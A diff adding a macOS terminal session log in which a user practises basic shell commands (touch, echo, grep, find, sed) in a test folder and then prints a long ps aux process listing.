@@ -1,0 +1,754 @@
+
+kristinius@YamahaMG10XUv03 ~ % cd Desktop
+kristinius@YamahaMG10XUv03 Desktop % touch bash2.txt
+kristinius@YamahaMG10XUv03 Desktop % cd
+kristinius@YamahaMG10XUv03 ~ % mkdir test3
+kristinius@YamahaMG10XUv03 ~ % cd test3
+kristinius@YamahaMG10XUv03 test3 % touch 4
+kristinius@YamahaMG10XUv03 test3 % echo -e "row1\nrow2\nrow3\nrow4" > 4
+kristinius@YamahaMG10XUv03 test3 % touch 5
+kristinius@YamahaMG10XUv03 test3 % echo -e "row1\nrow2\nrow3\nrow4" > 5
+kristinius@YamahaMG10XUv03 test3 % touch 6 
+kristinius@YamahaMG10XUv03 test3 % echo -e "row1\nrow2\nrow3\nrow4" > 6
+kristinius@YamahaMG10XUv03 test3 % grep "row2" 5
+row2
+kristinius@YamahaMG10XUv03 test3 % grep "row" *
+4:row1
+4:row2
+4:row3
+4:row4
+5:row1
+5:row2
+5:row3
+5:row4
+6:row1
+6:row2
+6:row3
+6:row4
+kristinius@YamahaMG10XUv03 test3 % grep -c "row" 6
+
+4
+kristinius@YamahaMG10XUv03 test3 % find 5
+5
+kristinius@YamahaMG10XUv03 test3 % pwd
+/Users/kristinius/test3
+kristinius@YamahaMG10XUv03 test3 % find /Users/kristinius/test3 -name "5" -exec rm {} \;
+kristinius@YamahaMG10XUv03 test3 % ls
+4	6
+kristinius@YamahaMG10XUv03 test3 % echo "test" >> 4
+
+kristinius@YamahaMG10XUv03 test3 % sed -i '' 's/test/fail/g' 4
+
+kristinius@YamahaMG10XUv03 test3 % echo "test" >> 4
+
+kristinius@YamahaMG10XUv03 test3 % ps aux
+USER               PID  %CPU %MEM      VSZ    RSS   TT  STAT STARTED      TIME COMMAND
+kristinius        1881  30.3  3.0 417297520 508176   ??  S    10:03PM   8:48.42 /System/Applicat
+_windowserver      399   6.2  1.1 412407264 179264   ??  Rs    9:09PM  14:16.61 /System/Library/
+_coreaudiod        440   4.9  0.3 410417024  56400   ??  Ss    9:09PM   3:56.16 /usr/sbin/coreau
+root               392   1.4  0.3 410423248  42944   ??  Ss    9:09PM   1:34.55 /usr/sbin/blueto
+root               381   0.9  0.2 410371040  25456   ??  Ss    9:09PM   0:10.83 /usr/libexec/das
+root               395   0.7  0.1 410364880  19584   ??  Ss    9:09PM   0:11.60 /usr/libexec/cor
+root               331   0.5  0.3 410485424  51248   ??  Ss    9:09PM   0:18.95 /usr/libexec/log
+root               385   0.3  0.2 410374032  33728   ??  Ss    9:09PM   0:14.85 /usr/libexec/Per
+kristinius         673   0.3  2.3 444970800 380880   ??  S     9:09PM   3:28.58 /Applications/Go
+kristinius        1527   0.3  2.3 1596872048 382288   ??  S     9:29PM   1:09.90 /Applications/Go
+kristinius         664   0.3  0.8 412091472 133744   ??  S     9:09PM   0:33.50 /System/Applicat
+kristinius         880   0.3  0.7 444218960 112832   ??  S     9:09PM   0:19.78 /Applications/Go
+kristinius         666   0.2  2.1 412279168 346400   ??  S     9:09PM   0:51.77 /Applications/Te
+root               410   0.2  0.2 410374944  25440   ??  Ss    9:09PM   0:08.18 /System/Library/
+kristinius         631   0.1  0.2 410372512  36688   ??  S     9:09PM   0:00.93 /usr/libexec/kno
+kristinius        2578   0.0  0.1 410343168  16224   ??  S    11:08PM   0:00.07 /System/Library/
+kristinius        2577   0.0  0.1 410343168  16160   ??  S    11:08PM   0:00.07 /System/Library/
+kristinius        2575   0.0  0.1 410343168  16256   ??  S    11:08PM   0:00.08 /System/Library/
+kristinius        2573   0.0  0.2 411079360  27392   ??  S    11:08PM   0:00.07 /System/Library/
+kristinius        2541   0.0  0.5 1596750768  79440   ??  S    11:04PM   0:00.04 /Applications/Go
+kristinius        2540   0.0  0.8 1597013952 134160   ??  S    11:04PM   0:00.19 /Applications/Go
+kristinius        2533   0.0  0.2 410343632  31072   ??  S    11:03PM   0:00.78 /System/Library/
+kristinius        2334   0.0  0.9 1597116096 152752   ??  S    10:45PM   0:03.21 /Applications/Go
+kristinius        2332   0.0  1.0 1596809312 168272   ??  S    10:45PM   0:03.24 /Applications/Go
+kristinius        2274   0.0  0.1 410919968  12272   ??  Ss   10:41PM   0:00.03 /System/Library/
+kristinius        2270   0.0  0.4 410757008  65328   ??  Ss   10:40PM   0:02.04 /System/Library/
+kristinius        2221   0.0  0.0 410173472   4576   ??  Ss   10:35PM   0:00.01 /System/Library/
+kristinius        2220   0.0  0.0 410363088   6960   ??  S    10:35PM   0:00.02 /System/Library/
+kristinius        2219   0.0  0.2 411259616  35024   ??  Ss   10:35PM   0:00.15 /System/Library/
+kristinius        2193   0.0  0.1 410956688  15888   ??  Ss   10:34PM   0:00.38 /System/Library/
+kristinius        2163   0.0  0.2 410423360  39792   ??  S    10:31PM   0:00.37 /System/Library/
+kristinius        2142   0.0  0.1 410363808  23488   ??  Ss   10:29PM   0:00.08 /System/Library/
+kristinius        2141   0.0  0.1 410364704  23264   ??  Ss   10:29PM   0:00.08 /System/Library/
+kristinius        2140   0.0  0.1 410203824   9936   ??  Ss   10:29PM   0:00.06 /System/Library/
+kristinius        2067   0.0  1.6 1598961856 274656   ??  S    10:20PM   0:06.22 /Applications/Go
+kristinius        2060   0.0  0.1 410341024  14080   ??  Ss   10:20PM   0:00.02 /System/Library/
+kristinius        2053   0.0  0.1 410398288  24704   ??  Ss   10:19PM   0:00.09 /System/Library/
+kristinius        1946   0.0  0.2 411269936  29648   ??  S    10:08PM   0:00.64 /System/Library/
+kristinius        1888   0.0  0.2 410379136  35984   ??  S    10:04PM   0:00.53 /System/Library/
+_fpsd             1886   0.0  0.3 410384256  42112   ??  Ss   10:04PM   0:04.89 /System/Library/
+kristinius        1883   0.0  0.1 34905084  10192   ??  Ss   10:03PM   0:00.43 /System/Applicat
+kristinius        1882   0.0  0.1 411238688  20848   ??  Ss   10:03PM   0:00.12 /System/Applicat
+root              1764   0.0  0.0 410613424   4912   ??  Ss    9:53PM   0:00.02 /Library/Apple/S
+kristinius        1679   0.0  0.0 410334992   8000   ??  Ss    9:42PM   0:00.04 /System/Library/
+kristinius        1549   0.0  0.9 1597018368 155328   ??  S     9:29PM   0:20.79 /Applications/Go
+kristinius        1547   0.0  0.1 410976640  22096   ??  S     9:29PM   0:00.08 /Library/Develop
+kristinius        1546   0.0  0.0 410606272   4640   ??  S     9:29PM   0:00.03 /Library/Develop
+_diskimagesiod    1537   0.0  0.2 410380016  28944   ??  Ss    9:29PM   0:00.10 /usr/libexec/dis
+root              1536   0.0  0.0 410329872   7952   ??  Ss    9:29PM   0:00.03 /System/Library/
+root              1535   0.0  0.1 410683936  12096   ??  Ss    9:29PM   0:00.06 /Library/Develop
+kristinius        1534   0.0  0.2 411243600  27856   ??  S     9:29PM   0:00.26 /Library/Develop
+root              1533   0.0  0.0 410622688   6672   ??  Ss    9:29PM   0:00.02 /System/Library/
+kristinius        1529   0.0  0.1 410682656  12624   ??  Ss    9:29PM   0:00.05 /System/Library/
+root              1477   0.0  0.0 410163808   4992   ??  Ss    9:24PM   0:00.02 /System/Library/
+kristinius        1454   0.0  0.1 410385664  19104   ??  S     9:21PM   0:00.23 /System/Library/
+kristinius        1444   0.0  0.2 410400208  35168   ??  S     9:19PM   0:01.57 /usr/libexec/nat
+kristinius        1443   0.0  0.1 410845472  22816   ??  Ss    9:19PM   0:00.13 /System/Library/
+kristinius        1442   0.0  0.1 410331168  15568   ??  S     9:19PM   0:00.09 /usr/libexec/key
+kristinius        1441   0.0  0.4 411020480  66864   ??  Ss    9:19PM   0:00.66 /System/Library/
+kristinius        1440   0.0  1.1 411359296 183232   ??  S     9:19PM   0:01.85 /System/Library/
+kristinius        1439   0.0  0.7 412051968 125568   ??  S     9:19PM   0:16.63 /System/Applicat
+kristinius        1433   0.0  0.1 411220208  15456   ??  Ss    9:18PM   0:17.85 /System/Library/
+kristinius        1432   0.0  0.2 411745920  38032   ??  Ss    9:18PM   0:00.70 /System/Library/
+kristinius        1431   0.0  0.4 444181712  70304   ??  S     9:18PM   0:00.94 /Applications/Go
+kristinius        1429   0.0  0.1 410314816   8736   ??  Ss    9:18PM   0:00.02 /System/Library/
+kristinius        1428   0.0  0.4 444301328  67232   ??  S     9:18PM   0:10.39 /Applications/Go
+kristinius        1414   0.0  3.2 1597151280 544352   ??  S     9:18PM   3:40.37 /Applications/Go
+root              1394   0.0  0.1 410374768  21392   ??  Ss    9:17PM   0:01.00 /System/Library/
+_neuralengine     1378   0.0  0.0 410266096   5424   ??  S     9:17PM   0:00.15 /usr/sbin/distno
+_neuralengine     1377   0.0  0.0 410195824   2768   ??  Ss    9:17PM   0:00.01 /System/Library/
+root              1376   0.0  0.0 410196656   3952   ??  Ss    9:17PM   0:00.04 /System/Library/
+root              1375   0.0  0.0 410294576   2944   ??  Ss    9:17PM   0:00.02 /usr/libexec/mma
+kristinius        1363   0.0  0.0 410293776   8128   ??  S     9:16PM   0:00.05 /usr/libexec/met
+kristinius        1362   0.0  0.2 410373648  33424   ??  S     9:16PM   1:10.04 /System/Library/
+systemkernelpanic  1355   0.0  0.1 410326704  12240   ??  S     9:15PM   0:00.08 /System/Library/
+root              1353   0.0  0.1 410331168  11664   ??  Ss    9:15PM   0:00.16 /usr/libexec/dpr
+kristinius        1350   0.0  0.1 410317456  15888   ??  S     9:14PM   0:00.59 /usr/libexec/pro
+root              1348   0.0  0.1 410326080  12672   ??  Ss    9:14PM   0:00.18 /usr/libexec/pow
+kristinius        1349   0.0  0.1 410195504  10480   ??  S     9:14PM   0:00.04 /usr/libexec/bac
+root              1347   0.0  0.1 410365232  19856   ??  Ss    9:14PM   0:02.96 /usr/libexec/ASP
+root              1342   0.0  0.0 410501680   2896   ??  Ss    9:14PM   0:00.02 /System/Library/
+kristinius        1343   0.0  0.2 411084592  28432   ??  S     9:14PM   0:00.09 /System/iOSSuppo
+kristinius        1341   0.0  0.1 411084240  17952   ??  S     9:14PM   0:00.28 /usr/libexec/mlh
+_audiomxd         1310   0.0  0.1 410823744  15776   ??  Ss    9:11PM   0:00.52 /usr/libexec/aud
+root              1309   0.0  0.1 410357328  13712   ??  Ss    9:11PM   0:03.30 /usr/libexec/aud
+_rmd              1307   0.0  0.1 410786352  10176   ??  Ss    9:11PM   0:00.09 /System/Library/
+_rmd              1306   0.0  0.0 410785568   6464   ??  Ss    9:11PM   0:00.09 /System/Library/
+_rmd              1305   0.0  0.0 410884208   5936   ??  Ss    9:11PM   0:00.08 /System/Library/
+_rmd              1304   0.0  0.1 410753152   9968   ??  Ss    9:11PM   0:00.10 /System/Library/
+_rmd              1303   0.0  0.1 410753216   9584   ??  Ss    9:11PM   0:00.07 /System/Library/
+_rmd              1302   0.0  0.0 410753120   5888   ??  Ss    9:11PM   0:00.06 /System/Library/
+_rmd              1301   0.0  0.0 410753104   5920   ??  Ss    9:11PM   0:00.06 /System/Library/
+_rmd              1298   0.0  0.1 410753648  10576   ??  Ss    9:11PM   0:00.06 /System/Library/
+_rmd              1297   0.0  0.0 410753104   5904   ??  Ss    9:11PM   0:00.05 /System/Library/
+_rmd              1296   0.0  0.0 410266096   5424   ??  S     9:11PM   0:00.15 /usr/sbin/distno
+_rmd              1295   0.0  0.0 410753200   6096   ??  Ss    9:11PM   0:00.05 /System/Library/
+_rmd              1294   0.0  0.0 410328016   8064   ??  Ss    9:11PM   0:00.13 /System/Library/
+kristinius        1292   0.0  0.1 410935792  10064   ??  Ss    9:11PM   0:00.03 /System/Library/
+kristinius        1291   0.0  0.0 410154112   3424   ??  Ss    9:11PM   0:00.01 /System/Library/
+kristinius        1288   0.0  0.2 411236016  31456   ??  Ss    9:10PM   0:00.25 /System/Library/
+kristinius        1285   0.0  0.1 410154448  12624   ??  Ss    9:10PM   0:00.03 /System/Library/
+kristinius        1283   0.0  0.2 410385680  26240   ??  Ss    9:10PM   0:00.55 /System/Library/
+systemkernelpanic  1245   0.0  0.0 410328912   6336   ??  S     9:10PM   0:00.37 /usr/libexec/tru
+kristinius        1244   0.0  0.0 410163408   4416   ??  S     9:10PM   0:00.02 /System/Library/
+systemkernelpanic  1198   0.0  0.1 410326144  10656   ??  S     9:10PM   0:00.39 /usr/libexec/con
+systemkernelpanic  1197   0.0  0.1 410482400  21456   ??  S     9:10PM   0:00.45 /usr/libexec/sec
+systemkernelpanic  1196   0.0  0.0 410163232   3616   ??  S     9:10PM   0:00.01 /System/Library/
+systemkernelpanic  1195   0.0  0.1 410326496  12112   ??  S     9:10PM   0:00.06 /usr/libexec/pkd
+systemkernelpanic  1194   0.0  0.1 410352672  17696   ??  S     9:10PM   0:00.17 /usr/libexec/lsd
+systemkernelpanic  1185   0.0  0.0 410294320   6544   ??  S     9:10PM   0:00.09 /usr/sbin/cfpref
+kristinius        1184   0.0  0.1 410363968   8704   ??  S     9:10PM   0:00.04 /System/Library/
+systemkernelpanic  1180   0.0  0.1 410336992  20368   ??  SN    9:10PM   0:02.03 /System/Library/
+systemkernelpanic  1179   0.0  0.0 410266096   5712   ??  S     9:10PM   0:00.25 /usr/sbin/distno
+_nsurlsessiond    1171   0.0  0.0 411146448   5632   ??  Ss    9:10PM   0:05.22 /System/Library/
+_spotlight        1167   0.0  0.1 410326688  11696   ??  S     9:10PM   0:29.94 /System/Library/
+_spotlight        1166   0.0  0.1 410328912  13008   ??  SN    9:10PM   0:01.35 /System/Library/
+kristinius        1165   0.0  0.1 410326704  11696   ??  S     9:10PM   0:00.48 /System/Library/
+_spotlight        1164   0.0  0.1 410334976  13200   ??  S     9:10PM   0:00.51 /usr/libexec/tru
+root              1148   0.0  0.1 410328000  13120   ??  Ss    9:09PM   0:00.10 /System/Library/
+kristinius        1147   0.0  0.2 410233408  29472   ??  Ss    9:09PM   0:00.06 /System/Applicat
+kristinius        1146   0.0  0.1 410372528  22624   ??  Ss    9:09PM   0:00.05 /System/Applicat
+kristinius        1145   0.0  0.1 410241280  18656   ??  Ss    9:09PM   0:00.05 /System/Volumes/
+kristinius        1144   0.0  0.1 410223888  19424   ??  Ss    9:09PM   0:00.05 /System/Applicat
+kristinius        1142   0.0  0.0 410326704   6000   ??  Ss    9:09PM   0:00.04 /System/Library/
+root              1140   0.0  0.0 410293760   3136   ??  Ss    9:09PM   0:00.01 /System/Library/
+kristinius        1139   0.0  0.1 410304576   8640   ??  Ss    9:09PM   0:00.02 /System/Library/
+kristinius        1138   0.0  0.1 410294336   8560   ??  Ss    9:09PM   0:00.02 /System/Library/
+kristinius        1131   0.0  0.0 410323008   6784   ??  S     9:09PM   0:00.03 /System/Library/
+kristinius        1130   0.0  0.1 410372432  18320   ??  Ss    9:09PM   0:00.04 /System/Library/
+root              1128   0.0  0.0 410294336   7328   ??  Ss    9:09PM   0:00.14 /usr/libexec/tri
+kristinius        1127   0.0  0.4 410679648  67616   ??  Ss    9:09PM   0:06.82 /System/Library/
+kristinius        1126   0.0  0.4 410717744  68960   ??  Ss    9:09PM   0:02.24 /System/Library/
+kristinius        1125   0.0  0.1 34040116   9588   ??  Ss    9:09PM   0:00.20 /System/Library/
+kristinius        1124   0.0  0.1 410655008  11792   ??  Ss    9:09PM   0:00.04 /System/Library/
+_softwareupdate   1122   0.0  0.0 410304576   6512   ??  S     9:09PM   0:00.03 /System/Library/
+_softwareupdate   1120   0.0  0.0 410286112   6096   ??  S     9:09PM   0:00.05 /usr/sbin/cfpref
+kristinius        1119   0.0  0.1 410313792   8832   ??  Ss    9:09PM   0:00.02 /System/Library/
+_softwareupdate   1118   0.0  0.0 410163360   5520   ??  S     9:09PM   0:00.13 /System/Library/
+_softwareupdate   1117   0.0  0.4 410676480  65072   ??  Ss    9:09PM   0:06.59 /System/Library/
+kristinius        1116   0.0  0.1 410335728  18096   ??  S     9:09PM   0:00.37 /System/Library/
+kristinius        1115   0.0  0.1 410507104  22864   ??  Ss    9:09PM   0:00.08 /System/Library/
+kristinius        1114   0.0  0.1 410304576   8688   ??  Ss    9:09PM   0:00.03 /System/Library/
+kristinius        1113   0.0  0.1 410222864  16688   ??  Ss    9:09PM   0:00.03 /System/Library/
+kristinius        1112   0.0  0.1 410303552   8624   ??  Ss    9:09PM   0:00.02 /System/Library/
+kristinius        1111   0.0  0.1 410671392  11712   ??  Ss    9:09PM   0:00.04 /System/Library/
+kristinius        1110   0.0  0.1 410362640  15776   ??  Ss    9:09PM   0:00.02 /System/Library/
+kristinius        1109   0.0  0.1 410304576   8736   ??  Ss    9:09PM   0:00.02 /System/Library/
+kristinius        1108   0.0  0.1 410333440  20064   ??  S     9:09PM   0:01.23 /System/Library/
+kristinius        1107   0.0  0.1 410899360  25040   ??  Ss    9:09PM   0:00.11 /System/Library/
+kristinius        1099   0.0  0.1 410328240  16672   ??  S     9:09PM   0:00.48 /System/Library/
+kristinius        1106   0.0  0.1 410369184  21424   ??  S     9:09PM   0:00.31 /usr/libexec/adp
+root              1104   0.0  0.1 410956336  12032   ??  Ss    9:09PM   0:00.06 /private/var/db/
+root              1105   0.0  0.1 410326768   8944   ??  Ss    9:09PM   0:00.06 /usr/libexec/xpc
+kristinius        1103   0.0  0.0 410163856   7216   ??  S     9:09PM   0:00.02 /System/Library/
+kristinius        1102   0.0  0.1 410328144  15008   ??  S     9:09PM   0:00.12 /usr/libexec/dia
+kristinius        1101   0.0  0.1 410340000  24368   ??  S     9:09PM   0:00.15 /System/Library/
+kristinius        1100   0.0  0.1 410327680  17344   ??  S     9:09PM   0:00.07 /System/Library/
+kristinius        1098   0.0  0.1 410488512  21840   ??  S     9:09PM   0:00.62 /System/Library/
+kristinius        1092   0.0  0.0 410163280   2656   ??  Ss    9:09PM   0:00.03 /System/Library/
+kristinius        1096   0.0  0.1 410364784  16432   ??  S     9:09PM   0:00.53 /System/Library/
+kristinius        1086   0.0  1.1 1597033152 183440   ??  S     9:09PM   0:11.92 /Applications/Go
+kristinius        1084   0.0  0.0 410294336   4448   ??  Ss    9:09PM   0:00.05 /System/Library/
+kristinius        1083   0.0  0.1 410226496  10992   ??  S     9:09PM   0:00.07 /System/Library/
+kristinius        1081   0.0  0.1 410332352  10288   ??  S     9:09PM   0:00.09 /System/Library/
+kristinius        1078   0.0  0.0 410327168   5984   ??  S     9:09PM   0:00.44 /Library/Apple/S
+kristinius        1077   0.0  0.2 410499680  27776   ??  S     9:09PM   0:00.21 /System/Library/
+kristinius        1075   0.0  0.1 410925616   9120   ??  S     9:09PM   0:00.19 /System/Library/
+kristinius        1072   0.0  0.3 410520032  51360   ??  S     9:09PM   0:07.13 /System/Library/
+_fpsd             1071   0.0  0.1 410316960  18432   ??  Ss    9:09PM   0:00.67 /System/Library/
+root              1068   0.0  0.1 410334288  12576   ??  Ss    9:09PM   0:00.15 /System/Library/
+kristinius        1067   0.0  0.1 410330304  13888   ??  S     9:09PM   0:00.09 /usr/libexec/fin
+root              1064   0.0  0.0 410197104   6992   ??  S     9:09PM   0:00.22 /usr/sbin/system
+kristinius        1063   0.0  0.2 410347008  41056   ??  Ss    9:09PM   0:38.43 /System/Library/
+kristinius         890   0.0  0.0 410326960   4928   ??  S     9:09PM   0:00.07 /usr/libexec/MTL
+kristinius         811   0.0  0.1 410328256  11520   ??  S     9:09PM   0:00.22 /System/Library/
+kristinius         839   0.0  0.1 410329712   9472   ??  S     9:09PM   0:00.09 /System/Library/
+kristinius         883   0.0  0.2 410332928  26176   ??  S     9:09PM   0:02.76 /System/Library/
+root              1058   0.0  0.0 410162912   3408   ??  Ss    9:09PM   0:01.08 /usr/libexec/sys
+_nsurlsessiond    1056   0.0  0.1 411608224  16592   ??  Ss    9:09PM   0:00.17 /System/Library/
+root              1055   0.0  0.1 411180192  13936   ??  Ss    9:09PM   0:00.12 /System/Library/
+_assetcache       1054   0.0  0.1 410368704  15776   ??  Ss    9:09PM   0:00.10 /System/Library/
+kristinius        1053   0.0  0.6 410436528 107472   ??  S     9:09PM   0:07.84 /System/Library/
+root              1051   0.0  0.3 410327232  55408   ??  Ss    9:09PM   0:01.34 /Library/Apple/S
+root               822   0.0  0.0 410325712   4896   ??  Ss    9:09PM   0:00.07 /System/Library/
+_accessoryupdater  1050   0.0  0.0 410326400   4512   ??  Ss    9:09PM   0:00.08 /System/Library/
+_softwareupdate   1049   0.0  0.1 410370064  18928   ??  Ss    9:09PM   0:00.13 /usr/libexec/NRD
+kristinius        1048   0.0  0.0 410199536   4368   ??  S     9:09PM   0:00.01 /System/Library/
+_accessoryupdater  1045   0.0  0.1 410326368   9568   ??  Ss    9:09PM   0:00.06 /System/Library/
+_accessoryupdater  1044   0.0  0.0 410883616   7856   ??  Ss    9:09PM   0:00.04 /System/Library/
+_accessoryupdater  1041   0.0  0.1 410786688  10864   ??  Ss    9:09PM   0:00.06 /System/Library/
+_accessoryupdater  1042   0.0  0.1 410325952  10912   ??  Ss    9:09PM   0:00.06 /System/Library/
+_accessoryupdater  1039   0.0  0.1 410330912  14544   ??  Ss    9:09PM   0:00.07 /System/Library/
+_applepay         1047   0.0  0.0 410266096   5440   ??  S     9:09PM   0:00.15 /usr/sbin/distno
+kristinius        1046   0.0  0.4 410470000  74592   ??  S     9:09PM   0:47.55 /System/Library/
+kristinius        1043   0.0  0.1 410294352  10544   ??  S     9:09PM   0:00.33 /usr/libexec/gam
+_gamecontrollerd  1040   0.0  0.0 410266096   5408   ??  S     9:09PM   0:00.15 /usr/sbin/distno
+kristinius        1038   0.0  0.1 410354400  14784   ??  S     9:09PM   0:00.18 /System/Library/
+root              1036   0.0  0.0 410294624   5328   ??  Ss    9:09PM   0:00.06 /usr/libexec/nes
+_applepay         1035   0.0  0.1 410369520  16048   ??  Ss    9:09PM   0:00.33 /usr/libexec/nfc
+root              1034   0.0  0.0 410163344   4416   ??  S     9:09PM   0:00.12 /System/Library/
+kristinius         918   0.0  0.1 410368560  17808   ??  S     9:09PM   0:00.42 /System/Library/
+kristinius        1033   0.0  0.2 410411600  26640   ??  S     9:09PM   0:00.49 /System/Library/
+kristinius        1032   0.0  2.6 412146064 443872   ??  S     9:09PM   0:14.96 /opt/homebrew/op
+kristinius         940   0.0  0.1 410293904   9104   ??  S     9:09PM   0:00.05 /System/Library/
+kristinius         926   0.0  0.1 411202752  16608   ??  Ss    9:09PM   0:00.06 /System/Library/
+kristinius         916   0.0  0.0 410596592   2912   ??  S     9:09PM   0:00.02 /bin/sh /opt/hom
+_accessoryupdater   907   0.0  0.0 410266096   5440   ??  S     9:09PM   0:00.16 /usr/sbin/distno
+kristinius         925   0.0  0.1 410328784  20928   ??  S     9:09PM   0:00.09 /System/Cryptexe
+kristinius         917   0.0  0.1 410363424  10896   ??  S     9:09PM   0:00.07 /System/Library/
+kristinius         909   0.0  0.2 410369760  31520   ??  S     9:09PM   0:00.60 /System/Library/
+root               927   0.0  0.1 410327904   8496   ??  Ss    9:09PM   0:00.20 /System/Library/
+kristinius         920   0.0  0.1 411241184  20544   ??  S     9:09PM   0:00.09 /System/Library/
+kristinius         921   0.0  0.2 411630448  40464   ??  S     9:09PM   0:00.44 /System/Library/
+root               924   0.0  0.1 410293872   8544   ??  Ss    9:09PM   0:00.05 /System/Library/
+kristinius         914   0.0  0.2 411474496  29888   ??  S     9:09PM   0:01.59 /System/Library/
+kristinius         915   0.0  0.9 1596801872 143280   ??  S     9:09PM   0:03.72 /Applications/Go
+_assetcache        906   0.0  0.0 410266096   5440   ??  S     9:09PM   0:00.15 /usr/sbin/distno
+kristinius         905   0.0  0.0 410354192   6016   ??  S     9:09PM   0:01.70 trustevaluationa
+kristinius         674   0.0  0.2 410387520  31184   ??  S     9:09PM   0:09.63 /System/Library/
+kristinius         902   0.0  0.2 411612192  37072   ??  Ss    9:09PM   0:01.19 /System/Library/
+kristinius         900   0.0  0.2 410373792  28736   ??  S     9:09PM   0:00.67 /System/Library/
+root               899   0.0  0.1 410363280  16640   ??  Ss    9:09PM   0:00.67 /usr/libexec/rtc
+kristinius         897   0.0  0.1 410365760  18688   ??  S     9:09PM   0:00.17 /System/Library/
+root               896   0.0  0.2 410374800  28688   ??  S     9:09PM   0:00.54 /System/Library/
+kristinius         895   0.0  0.2 410373712  32608   ??  S     9:09PM   0:00.45 /System/Library/
+root               894   0.0  0.1 410344016  10640   ??  Ss    9:09PM   0:00.05 /System/Library/
+root               891   0.0  0.2 410355504  26064   ??  Ss    9:09PM   0:00.35 /usr/sbin/BTLESe
+root               889   0.0  0.0 410623408   6976   ??  Ss    9:09PM   0:00.02 /usr/libexec/onl
+kristinius         888   0.0  0.1 410223632   9264   ??  S     9:09PM   0:00.03 /usr/sbin/BTLESe
+root               886   0.0  0.0 410165616   7104   ??  Ss    9:09PM   0:00.02 /System/Library/
+kristinius         884   0.0  0.1 410357600  20752   ??  SN    9:09PM   0:02.38 /System/Library/
+kristinius         881   0.0  0.4 444165232  72144   ??  S     9:09PM   0:00.87 /Applications/Go
+root               879   0.0  0.1 410371520  12720   ??  Ss    9:09PM   0:00.09 /System/Library/
+kristinius         878   0.0  1.2 444764016 209520   ??  S     9:09PM   3:17.96 /Applications/Go
+kristinius         877   0.0  0.1 410371904  20992   ??  S     9:09PM   0:00.20 cloudphotod
+_driverkit         876   0.0  0.0 410597072   2304   ??  Ss    9:09PM   0:00.01 /System/Library/
+_driverkit         874   0.0  0.0 410596048   2016   ??  Ss    9:09PM   0:00.01 /System/Library/
+kristinius         872   0.0  0.2 410369104  26160   ??  S     9:09PM   0:18.80 /System/Library/
+kristinius         873   0.0  0.1 410650480  10704   ??  S     9:09PM   0:00.18 /usr/libexec/Sid
+kristinius         871   0.0  0.0 443704544   6832   ??  S     9:09PM   0:00.01 /Applications/Go
+kristinius         868   0.0  0.1 410372464  22704   ??  S     9:09PM   0:00.38 /usr/libexec/bio
+kristinius         865   0.0  0.1 410364128   8720   ??  Ss    9:09PM   0:00.02 /System/Library/
+kristinius         864   0.0  0.1 410363840  19632   ??  S     9:09PM   0:00.15 /System/Library/
+kristinius         863   0.0  0.1 410332544  14848   ??  S     9:09PM   0:00.05 /usr/libexec/ses
+kristinius         862   0.0  0.1 410823168  21776   ??  S     9:09PM   0:00.38 /System/Library/
+root               861   0.0  0.1 410191952  10384   ??  Ss    9:09PM   0:00.02 /System/Library/
+kristinius         856   0.0  0.1 410369552  19696   ??  S     9:09PM   0:00.14 /usr/libexec/bet
+kristinius         852   0.0  0.1 410369536  17856   ??  S     9:09PM   0:00.08 /System/Library/
+kristinius         853   0.0  0.4 411050112  65744   ??  Ss    9:09PM   0:01.46 /System/Library/
+kristinius         849   0.0  0.3 410393712  54272   ??  S     9:09PM   0:04.39 /System/Library/
+kristinius         844   0.0  0.1 410368160  15920   ??  S     9:09PM   0:00.12 /System/Library/
+kristinius         843   0.0  0.1 410367920  23968   ??  S     9:09PM   0:00.19 /usr/libexec/fin
+kristinius         838   0.0  0.2 410374800  30512   ??  S     9:09PM   0:00.66 /System/Library/
+kristinius         837   0.0  0.1 410369616  20416   ??  S     9:09PM   0:00.27 /System/Library/
+kristinius         836   0.0  0.0 410920960   4896 s000  S     9:09PM   0:00.24 -zsh
+root               835   0.0  0.1 410296384   8736   ??  Ss    9:09PM   0:00.03 /System/Library/
+root               834   0.0  0.1 410788688  10368 s000  Ss    9:09PM   0:00.01 login -pf kristi
+kristinius         833   0.0  0.2 410398896  38144   ??  S     9:09PM   0:01.67 /System/Library/
+kristinius         831   0.0  0.2 410388432  39616   ??  S     9:09PM   0:01.71 /usr/libexec/sea
+kristinius         832   0.0  0.1 410363824  15520   ??  S     9:09PM   0:00.65 /usr/libexec/swc
+kristinius         830   0.0  0.3 410497360  57696   ??  Ss    9:09PM   0:00.66 /System/Library/
+root               829   0.0  0.1 410362720  12992   ??  Ss    9:09PM   0:00.04 /System/Library/
+kristinius         827   0.0  0.3 411762576  44032   ??  S     9:09PM   0:00.28 /System/Library/
+kristinius         825   0.0  0.2 410382080  38288   ??  S     9:09PM   0:08.54 /System/Library/
+root               824   0.0  0.1 410363344  14400   ??  Ss    9:09PM   0:00.23 /usr/libexec/wif
+kristinius         823   0.0  0.1 410330704   8752   ??  S     9:09PM   0:00.05 /usr/libexec/WiF
+root               821   0.0  0.1 410323584  10064   ??  Ss    9:09PM   0:00.04 /System/Library/
+kristinius         819   0.0  0.0 410167504   6032   ??  S     9:09PM   0:00.02 /usr/libexec/spi
+kristinius         818   0.0  0.2 410369808  29440   ??  S     9:09PM   0:55.52 /System/Library/
+root               817   0.0  0.4 410370736  69872   ??  Ss    9:09PM   0:14.90 /usr/sbin/spindu
+kristinius         815   0.0  0.2 414841552  40672   ??  S     9:09PM   0:14.73 /System/Library/
+_installcoordinationd   816   0.0  0.1 410363264  12864   ??  Ss    9:09PM   0:00.04 /System/Library/
+kristinius         814   0.0  0.1 410371216  21920   ??  S     9:09PM   0:00.96 /System/Library/
+root               813   0.0  0.1 410363664  16912   ??  Ss    9:09PM   0:00.08 /System/Library/
+root               812   0.0  0.0 410163248   7584   ??  Ss    9:09PM   0:00.08 /System/Library/
+kristinius         810   0.0  0.2 410421456  36544   ??  S     9:09PM   0:00.46 /usr/libexec/stu
+root               809   0.0  0.1 410336416   9856   ??  Ss    9:09PM   0:00.04 /System/Library/
+kristinius         808   0.0  0.1 410365328  22048   ??  S     9:09PM   0:02.22 /usr/libexec/tri
+kristinius         803   0.0  0.1 410304576  10896   ??  S     9:09PM   0:00.02 /System/Library/
+kristinius         804   0.0  0.2 410386080  35008   ??  S     9:09PM   0:01.08 /System/Library/
+kristinius         806   0.0  0.1 410355872  15056   ??  S     9:09PM   0:00.08 /System/Library/
+kristinius         807   0.0  0.2 410862032  28400   ??  Ss    9:09PM   0:00.15 /System/Library/
+root               805   0.0  0.0 410163248   7568   ??  Ss    9:09PM   0:00.08 /System/Library/
